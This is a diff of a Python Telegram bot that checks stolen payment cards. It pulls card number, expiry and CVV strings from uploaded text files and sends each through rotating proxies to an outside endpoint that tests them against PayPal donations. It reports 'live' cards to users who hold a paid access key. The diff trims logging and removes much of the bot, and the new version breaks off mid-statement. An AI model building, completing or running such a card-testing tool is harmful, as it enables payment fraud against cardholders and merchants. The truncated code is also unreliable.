@@ -20,7 +20,6 @@ PROXIES = [
 
 client = TelegramClient('bot', API_ID, API_HASH)
 
-# ================== UTILITIES ==================
 async def load_json(filename):
     try:
         if not os.path.exists(filename):
@@ -50,7 +49,6 @@ async def is_premium(user_id):
     except:
         return False
 
-# ================== KEY SYSTEM ==================
 async def generate_key(days: int = 30):
     import secrets
     key = "GIVEWP-" + secrets.token_hex(8).upper()
@@ -74,109 +72,20 @@ async def redeem_key(user_id, key: str):
     await save_json(PREMIUM_FILE, premium)
     return f"✅ Success! Premium activated for {days} days."
 
-# ================== CHECKER WITH FULL LOGS ==================
+# ================== CHECKER ==================
 async def check_card(card: str):
     current_time = datetime.now().strftime('%H:%M:%S')
-    print(f"\n[{current_time}] ===================== START ======================")
-    print(f"[{current_time}] CHECKING CARD: {card}")
+    print(f"[{current_time}] CHECKING → {card}")
 
     try:
         proxy = random.choice(PROXIES)
         proxy_url = f"http://{proxy.split(':')[2]}:{proxy.split(':')[3]}@{proxy.split(':')[0]}:{proxy.split(':')[1]}"
-        print(f"[{current_time}] PROXY USED: {proxy.split(':')[0]}:{proxy.split(':')[1]}")
 
         url = f"http://138.128.240.15:8024/paypal_1?cc={card}"
 
         async with aiohttp.ClientSession() as session:
             async with session.get(url, proxy=proxy_url, timeout=40) as r:
                 text = await r.text()
-                print(f"[{current_time}] STATUS CODE: {r.status}")
-                print(f"[{current_time}] RAW RESPONSE: {text[:600]}")
+                print(f"[{current_time}] STATUS: {r.status} | RESPONSE: {text[:400]}")
 
-                if r.status == 200 and any(x in text.lower() for x in ["approved", "success", "live", "charged"]):
-                    print(f"[{current_time}] ✅ LIVE HIT DETECTED!")
-                    return {"status": "Approved", "response": "PAYPAL LIVE"}
-                else:
-                    print(f"[{current_time}] ❌ DECLINED")
-                    return {"status": "Declined", "response": "Declined"}
-
-    except Exception as e:
-        print(f"[{current_time}] ❌ ERROR: {e}")
-        return {"status": "Declined", "response": "Error"}
-
-async def send_approved(event, card):
-    msg = f"""
-**Approved ✅**
-━━━━━━━━━━━━━
-[ϟ] 𝗖𝗖 - `{card}`
-[ϟ] 𝗦𝘁𝗮𝘁𝘂𝘀 : PAYPAL LIVE
-[ϟ] 𝗚𝗮𝘁𝗲 - PayPal Donate
-━━━━━━━━━━━━━
-"""
-    await event.reply(msg)
-
-# ================== BOT ==================
-@client.on(events.NewMessage(pattern=r'(?i)^[/.](start|help)$'))
-async def start(event):
-    if not await is_premium(event.sender_id):
-        return await event.reply("**❌ No Access**\n\nSend `/key YOURKEY`")
-    await event.reply("**🔥 PayPal Checker**\nSend `.txt` file")
-
-@client.on(events.NewMessage(pattern=r'(?i)^[/.]genkey(?:\s+(\d+))?$'))
-async def genkey(event):
-    if event.sender_id != OWNER_ID:
-        return await event.reply("Owner only!")
-    days = int(event.pattern_match.group(1) or 30)
-    key = await generate_key(days)
-    await event.reply(f"✅ New Key:\n`{key}`")
-
-@client.on(events.NewMessage(pattern=r'(?i)^[/.]key(?:\s+(.+))?$'))
-async def redeem(event):
-    key = event.pattern_match.group(1)
-    if not key:
-        return await event.reply("Usage: `/key YOURKEY`")
-    msg = await redeem_key(event.sender_id, key)
-    await event.reply(msg)
-
-@client.on(events.NewMessage())
-async def txt_handler(event):
-    if not event.document or not str(event.file.name).lower().endswith('.txt'):
-        return
-    if not await is_premium(event.sender_id):
-        return await event.reply("❌ No Access!")
-
-    await event.reply("📂 Processing TXT file...")
-    path = f"temp_{event.sender_id}.txt"
-    await event.download_media(path)
-
-    cards = []
-    async with aiofiles.open(path, "r", encoding="utf-8", errors="ignore") as f:
-        content = await f.read()
-        found = re.findall(r'\d{15,16}\s*[\|:/-]\s*\d{1,2}\s*[\|:/-]\s*\d{2,4}\s*[\|:/-]\s*\d{3,4}', content)
-        for c in found:
-            cleaned = re.sub(r'[^0-9|]', '', c.replace(' ', ''))
-            if len(cleaned.split('|')) == 4:
-                cards.append(cleaned)
-
-    os.remove(path)
-
-    if not cards:
-        return await event.reply("❌ No valid cards!")
-
-    await event.reply(f"✅ Found **{len(cards)}** cards. Starting check...")
-
-    for card in cards:
-        result = await check_card(card)
-        if result["status"] == "Approved":
-            await send_approved(event, card)
-        else:
-            await event.reply(f"❌ Declined\n`{card}`")
-        await asyncio.sleep(5)
-
-async def main():
-    print("🚀 Bot Started - FULL LOGS MODE ENABLED")
-    await client.start(bot_token=BOT_TOKEN)
-    await client.run_until_disconnected()
-
-if __name__ == "__main__":
-    asyncio.run(main())
+                if r.status == 200 and
